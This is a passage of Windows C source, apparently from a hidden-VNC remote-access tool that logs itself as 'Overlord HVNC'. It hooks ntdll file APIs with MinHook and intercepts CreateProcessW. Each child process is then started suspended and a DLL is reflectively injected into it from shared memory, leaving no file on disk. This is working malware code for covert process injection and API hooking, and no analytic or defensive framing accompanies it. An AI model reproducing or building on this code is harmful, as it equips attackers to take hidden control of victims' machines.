        SIZE_T written;
        if (!WriteProcessMemory(hProcess, remoteMem, dllBytes, dllSize, &written)) {
            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
            CrashLog("[ChildInject] FAIL: WriteProcessMemory failed");
            LogDebug(L"[ChildInject] WriteProcessMemory failed");
            return FALSE;
        }

        LPTHREAD_START_ROUTINE remoteLoader =
            (LPTHREAD_START_ROUTINE)((BYTE*)remoteMem + loaderOffset);

        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024,
            remoteLoader, NULL, 0, NULL);
        if (!hThread) {
            CrashLog("[ChildInject] FAIL: CreateRemoteThread failed");
            LogDebug(L"[ChildInject] CreateRemoteThread failed");
            return FALSE;
        }

        DWORD waitResult = WaitForSingleObject(hThread, 30000);
        if (waitResult == WAIT_TIMEOUT) {
            CrashLog("[ChildInject] WARN: loader thread timed out (30s)");
        } else {
            CrashLog("[ChildInject] OK: child injection completed");
        }
        CloseHandle(hThread);
        return TRUE;
    }

    BOOL WINAPI HookedCreateProcessW(
        LPCWSTR lpApplicationName,
        LPWSTR lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL bInheritHandles,
        DWORD dwCreationFlags,
        LPVOID lpEnvironment,
        LPCWSTR lpCurrentDirectory,
        LPSTARTUPINFOW lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
    ) {
        if (!OriginalCreateProcessW) return FALSE;

        if (!g_HooksInitialized || !g_DllRawBytes || g_DllRawSize == 0) {
            return OriginalCreateProcessW(
                lpApplicationName, lpCommandLine,
                lpProcessAttributes, lpThreadAttributes,
                bInheritHandles, dwCreationFlags,
                lpEnvironment, lpCurrentDirectory,
                lpStartupInfo, lpProcessInformation
            );
        }

        BOOL wasSuspended = (dwCreationFlags & CREATE_SUSPENDED) != 0;
        DWORD modifiedFlags = dwCreationFlags | CREATE_SUSPENDED;

        BOOL result = OriginalCreateProcessW(
            lpApplicationName, lpCommandLine,
            lpProcessAttributes, lpThreadAttributes,
            bInheritHandles, modifiedFlags,
            lpEnvironment, lpCurrentDirectory,
            lpStartupInfo, lpProcessInformation
        );

        if (result && lpProcessInformation) {
            CrashLog("[CreateProcessW] Injecting DLL into child process...");
            LogDebug(L"[CreateProcessW] Reflective-injecting DLL into child process");
            if (!ReflectiveInjectIntoChild(lpProcessInformation->hProcess,
                    (const BYTE*)g_DllRawBytes, g_DllRawSize)) {
                CrashLog("[CreateProcessW] Child injection FAILED");
                LogDebug(L"[CreateProcessW] Child injection failed");
            } else {
                CrashLog("[CreateProcessW] Child injection OK");
                LogDebug(L"[CreateProcessW] Child injection succeeded");
            }

            // Always resume the child if we suspended it — don't leave zombie processes
            if (!wasSuspended) {
                ResumeThread(lpProcessInformation->hThread);
            }
        }

        return result;
    }

    // Install all hooks
    void InstallNtApiHooks(LPVOID lpParameter) {
        // Use a global try-catch to prevent any crashes
        __try {
            __try {
                WCHAR crashLogPath[512];
                ExpandEnvironmentStringsW(L"%TEMP%\\crashlogovd.log", crashLogPath, 512);
                g_CrashLog = CreateFileW(crashLogPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                g_CrashLog = INVALID_HANDLE_VALUE;
            }

            CrashLog("=== Overlord HVNC DLL Loaded ===");

#if ENABLE_DEBUG_LOGGING
            // Enable verbose logging for debugging
            WCHAR logPath[512];
            __try {
                ExpandEnvironmentStringsW(L"%TEMP%\\rdi_hooks.log", logPath, 512);
                g_LogFile = CreateFileW(logPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                g_LogFile = INVALID_HANDLE_VALUE;
            }

            if (g_LogFile != INVALID_HANDLE_VALUE) {
                LogDebugA("=== DLL Injection Started ===");
            }
#else
            g_LogFile = INVALID_HANDLE_VALUE;
#endif

            // Initialize to empty strings to prevent crashes
            g_SearchString[0] = L'\0';
            g_ReplacementString[0] = L'\0';
            g_DllSectionHandle = NULL;
            g_DllRawBytes = NULL;
            g_DllRawSize = 0;

            // Try to get configuration from environment variables
            __try {
                WCHAR envSearchString[512] = { 0 };
                WCHAR envReplaceString[512] = { 0 };

                DWORD searchLen = GetEnvironmentVariableW(L"RDI_SEARCH_PATH", envSearchString, 512);
                DWORD replaceLen = GetEnvironmentVariableW(L"RDI_REPLACE_PATH", envReplaceString, 512);

                if (searchLen > 0 && searchLen < 512 && replaceLen > 0 && replaceLen < 512) {
                    CrashLog("[ENV] Search/Replace paths found");
                    CrashLogW(envSearchString);
                    CrashLog(" -> ");
                    CrashLogW(envReplaceString);
                    wcsncpy_s(g_SearchString, 512, envSearchString, searchLen);
                    g_SearchString[searchLen] = L'\0';
                    wcsncpy_s(g_ReplacementString, 512, envReplaceString, replaceLen);
                    g_ReplacementString[replaceLen] = L'\0';

                    if (g_LogFile != INVALID_HANDLE_VALUE) {
                        LogDebug(L"========================================");
                        LogDebug(L"[ENV] Search string from env: ");
                        LogDebug(g_SearchString);
                        LogDebug(L"[ENV] Replacement string from env: ");
                        LogDebug(g_ReplacementString);

                        char lenMsg[256];
                        sprintf_s(lenMsg, 256, "[ENV] Search string length: %zu characters", wcslen(g_SearchString));
                        LogDebugA(lenMsg);
                        LogDebug(L"========================================");
                    }
                }
                else {
                    CrashLog("[ENV] RDI_SEARCH_PATH / RDI_REPLACE_PATH not found or empty — path redirection disabled");
                    if (g_LogFile != INVALID_HANDLE_VALUE) {
                        LogDebugA("Environment variables not found, hooks disabled");
                    }
                }

                // Read DLL section for child process injection (in-memory, no file on disk)
                WCHAR envSectionName[512] = { 0 };
                WCHAR envDllSize[32] = { 0 };
                DWORD sectionNameLen = GetEnvironmentVariableW(L"RDI_DLL_SECTION", envSectionName, 512);
                DWORD dllSizeLen = GetEnvironmentVariableW(L"RDI_DLL_SIZE", envDllSize, 32);

                if (sectionNameLen > 0 && sectionNameLen < 512 && dllSizeLen > 0 && dllSizeLen < 32) {
                    g_DllRawSize = 0;
                    for (DWORD i = 0; i < dllSizeLen; i++) {
                        g_DllRawSize = g_DllRawSize * 10 + (envDllSize[i] - L'0');
                    }

                    g_DllSectionHandle = OpenFileMappingW(FILE_MAP_READ, FALSE, envSectionName);
                    if (g_DllSectionHandle) {
                        g_DllRawBytes = MapViewOfFile(g_DllSectionHandle, FILE_MAP_READ, 0, 0, g_DllRawSize);
                        if (g_DllRawBytes) {
                            char msg[256];
                            sprintf_s(msg, 256, "[ENV] DLL shared memory mapped OK: %lu bytes", g_DllRawSize);
                            CrashLog(msg);
                            if (g_LogFile != INVALID_HANDLE_VALUE) {
                                LogDebugA(msg);
                            }
                        } else {
                            CloseHandle(g_DllSectionHandle);
                            g_DllSectionHandle = NULL;
                            g_DllRawSize = 0;
                            CrashLog("[ENV] FAIL: MapViewOfFile failed for DLL section");
                            if (g_LogFile != INVALID_HANDLE_VALUE) {
                                LogDebugA("[ENV] MapViewOfFile failed for DLL section");
                            }
                        }
                    } else {
                        g_DllRawSize = 0;
                        CrashLog("[ENV] FAIL: OpenFileMappingW failed for DLL section");
                        if (g_LogFile != INVALID_HANDLE_VALUE) {
                            LogDebugA("[ENV] OpenFileMappingW failed for DLL section");
                        }
                    }
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                if (g_LogFile != INVALID_HANDLE_VALUE) {
                    LogDebugA("Exception reading environment variables");
                }
                g_SearchString[0] = L'\0';
                g_ReplacementString[0] = L'\0';
            }

            // Initialize MinHook (this must succeed)
            if (g_LogFile != INVALID_HANDLE_VALUE) {
                LogDebugA("Initializing MinHook...");
            }

            if (MH_Initialize() != MH_OK) {
                CrashLog("FATAL: MH_Initialize() failed — MinHook could not start");
                if (g_LogFile != INVALID_HANDLE_VALUE) {
                    LogDebugA("ERROR: MinHook initialization failed!");
                }
                return;
            }
            CrashLog("[INIT] MinHook initialized OK");

            if (g_LogFile != INVALID_HANDLE_VALUE) {
                LogDebugA("MinHook initialized successfully");
            }

            HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
            if (!ntdll) {
                CrashLog("FATAL: GetModuleHandleW(ntdll.dll) returned NULL");
                if (g_LogFile != INVALID_HANDLE_VALUE) {
                    LogDebugA("ERROR: Failed to get ntdll.dll handle!");
                }
                MH_Uninitialize();
                return;
            }

            if (g_LogFile != INVALID_HANDLE_VALUE) {
                LogDebugA("Got ntdll.dll handle");
            }

            #define SAFE_HOOK(target, detour, ppOriginal, label) do { \
                MH_STATUS _cr = MH_CreateHook((LPVOID)(target), (LPVOID)(detour), (LPVOID*)(ppOriginal)); \
                if (_cr == MH_OK) { \
                    MH_STATUS _en = MH_EnableHook((LPVOID)(target)); \
                    if (_en != MH_OK) { \
                        MH_RemoveHook((LPVOID)(target)); \
                        *(ppOriginal) = NULL; \
                        CrashLog("FAIL: MH_EnableHook failed for " label); \
                        if (g_LogFile != INVALID_HANDLE_VALUE) LogDebugA("WARN: MH_EnableHook failed for " label); \
                    } else { \
                        CrashLog("[HOOK] OK: " label); \
                        if (g_LogFile != INVALID_HANDLE_VALUE) LogDebugA("Hooked " label); \
                    } \
                } else { \
                    *(ppOriginal) = NULL; \
                    CrashLog("FAIL: MH_CreateHook failed for " label); \
                    if (g_LogFile != INVALID_HANDLE_VALUE) LogDebugA("WARN: MH_CreateHook failed for " label); \
                } \
            } while(0)

            // Hook all the NT APIs
            FARPROC pNtCreateFile = GetProcAddress(ntdll, "NtCreateFile");
            if (pNtCreateFile) {
                SAFE_HOOK(pNtCreateFile, &HookedNtCreateFile, &OriginalNtCreateFile, "NtCreateFile");
            }

            FARPROC pNtOpenFile = GetProcAddress(ntdll, "NtOpenFile");
            if (pNtOpenFile) {
                SAFE_HOOK(pNtOpenFile, &HookedNtOpenFile, &OriginalNtOpenFile, "NtOpenFile");
            }

            FARPROC pNtDeleteFile = GetProcAddress(ntdll, "NtDeleteFile");
            if (pNtDeleteFile) {
                SAFE_HOOK(pNtDeleteFile, &HookedNtDeleteFile, &OriginalNtDeleteFile, "NtDeleteFile");
            }

            FARPROC pNtSetInformationFile = GetProcAddress(ntdll, "NtSetInformationFile");
            if (pNtSetInformationFile) {
                SAFE_HOOK(pNtSetInformationFile, &HookedNtSetInformationFile, &OriginalNtSetInformationFile, "NtSetInformationFile");
            }

            FARPROC pNtQueryAttributesFile = GetProcAddress(ntdll, "NtQueryAttributesFile");
            if (pNtQueryAttributesFile) {
                SAFE_HOOK(pNtQueryAttributesFile, &HookedNtQueryAttributesFile, &OriginalNtQueryAttributesFile, "NtQueryAttributesFile");
            }

            FARPROC pNtQueryFullAttributesFile = GetProcAddress(ntdll, "NtQueryFullAttributesFile");
            if (pNtQueryFullAttributesFile) {
                SAFE_HOOK(pNtQueryFullAttributesFile, &HookedNtQueryFullAttributesFile, &OriginalNtQueryFullAttributesFile, "NtQueryFullAttributesFile");
            }

            FARPROC pNtQueryDirectoryFile = GetProcAddress(ntdll, "NtQueryDirectoryFile");
            if (pNtQueryDirectoryFile) {
                SAFE_HOOK(pNtQueryDirectoryFile, &HookedNtQueryDirectoryFile, &OriginalNtQueryDirectoryFile, "NtQueryDirectoryFile");
            }

            FARPROC pNtQueryDirectoryFileEx = GetProcAddress(ntdll, "NtQueryDirectoryFileEx");
            if (pNtQueryDirectoryFileEx) {
                SAFE_HOOK(pNtQueryDirectoryFileEx, &HookedNtQueryDirectoryFileEx, &OriginalNtQueryDirectoryFileEx, "NtQueryDirectoryFileEx");
            }

            HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
            if (k32) {
                FARPROC pCreateProcessW = GetProcAddress(k32, "CreateProcessW");
                if (pCreateProcessW) {
                    SAFE_HOOK(pCreateProcessW, &HookedCreateProcessW, &OriginalCreateProcessW, "CreateProcessW");
                }
            }

            #undef SAFE_HOOK

            if (OriginalNtCreateFile && OriginalNtOpenFile) {
                g_HooksInitialized = TRUE;
                CrashLog("=== All hooks installed successfully ===");
                if (g_LogFile != INVALID_HANDLE_VALUE) {
                    LogDebugA("=== All hooks installed successfully ===");
                }
            } else {
                CrashLog("FATAL: Critical hooks (NtCreateFile/NtOpenFile) failed — tearing down all hooks");
                if (g_LogFile != INVALID_HANDLE_VALUE) {
                    LogDebugA("ERROR: Critical hooks (NtCreateFile/NtOpenFile) failed. Removing all hooks.");
                }
                MH_DisableHook(MH_ALL_HOOKS);
                MH_Uninitialize();
                OriginalNtCreateFile = NULL;
                OriginalNtOpenFile = NULL;
                OriginalNtDeleteFile = NULL;
                OriginalNtSetInformationFile = NULL;
                OriginalNtQueryAttributesFile = NULL;
                OriginalNtQueryFullAttributesFile = NULL;
                OriginalNtQueryDirectoryFile = NULL;
                OriginalNtQueryDirectoryFileEx = NULL;
                OriginalCreateProcessW = NULL;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            {
                char excMsg[256];
                sprintf_s(excMsg, 256, "CRITICAL EXCEPTION during hook install! Code: 0x%X", GetExceptionCode());
                CrashLog(excMsg);
                if (g_LogFile != INVALID_HANDLE_VALUE) {
                    LogDebugA(excMsg);
                }
            }
        }
    }

    void RemoveNtApiHooks() {
        __try {
            CrashLog("=== Removing hooks ===");
            LogDebugA("=== Removing hooks ===");
            g_HooksInitialized = FALSE;
            MH_DisableHook(MH_ALL_HOOKS);
            MH_Uninitialize();

            if (g_DllRawBytes) {
                UnmapViewOfFile(g_DllRawBytes);
                g_DllRawBytes = NULL;
            }
            if (g_DllSectionHandle) {
                CloseHandle(g_DllSectionHandle);
                g_DllSectionHandle = NULL;
            }

            CrashLog("=== Cleanup complete ===");

            if (g_LogFile != INVALID_HANDLE_VALUE) {
                CloseHandle(g_LogFile);
                g_LogFile = INVALID_HANDLE_VALUE;
            }
            if (g_CrashLog != INVALID_HANDLE_VALUE) {
                CloseHandle(g_CrashLog);
                g_CrashLog = INVALID_HANDLE_VALUE;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            // Fail silently on cleanup
        }
    }

#ifdef __cplusplus
}
#endif
